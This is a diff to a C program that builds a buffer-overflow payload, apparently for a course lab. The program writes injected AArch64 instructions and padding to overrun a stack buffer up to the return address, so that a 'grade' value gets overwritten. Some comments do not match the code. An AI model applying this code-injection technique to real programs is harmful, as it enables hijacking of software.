@@ -43,17 +43,21 @@ int main(void)
    uiInstr = MiniAssembler_mov(0, 'A');
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
-   /* Writes the instruction mov w0, ‘A’ */
+   /* Writes the instruction mov w0, ‘+’ */
    uiInstr = MiniAssembler_mov(0, '+');
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
-/* Writes the instruction bl printf - NOT WORKING RN */
+   /* Writes the instruction bl printf - NOT WORKING RN */
    uiInstr = MiniAssembler_mov(0, '+');
+   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+
+   /* Writes the instruction mov w0, ‘\0’ */
+   uiInstr = MiniAssembler_mov(0, '\0');
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
  
    /* Writes the instruction adr x1, grade */
    uiInstr = MiniAssembler_adr(1, 0x420044,
-   0x420070);
+   0x420074);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction strb w0, [x1] */
@@ -61,12 +65,12 @@ int main(void)
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction b 0x400864 (call of printf) */
-   uiInstr = MiniAssembler_b(0x400864, 0x420078);
+   uiInstr = MiniAssembler_b(0x400864, 0x42007C);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes enough null bytes to the dataB file
    to overrun until X30 */
-   for (i = 0; i<BUFSIZE-36; i++){
+   for (i = 0; i<BUFSIZE-40; i++){
        fprintf(psFile, "%c", 0x00);
    }
 
